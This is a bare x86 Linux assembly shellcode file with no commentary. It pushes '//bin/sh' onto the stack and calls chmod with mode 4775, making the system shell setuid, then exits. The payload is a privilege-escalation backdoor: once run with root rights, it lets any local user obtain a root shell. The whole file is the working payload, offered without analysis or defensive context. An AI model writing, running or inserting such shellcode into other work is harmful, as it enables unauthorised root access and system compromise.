section .text
	global _start

_start: 

 xor    eax,eax
 xor    ebx,ebx
 xor    ecx,ecx
 push   ebx
 push   0x68732f6e
 push   0x69622f2f
 mov    ebx,esp
 mov    cx,0x9fd
 mov    al,0xf
 int    0x80
 mov    al,0x1
 int    0x80

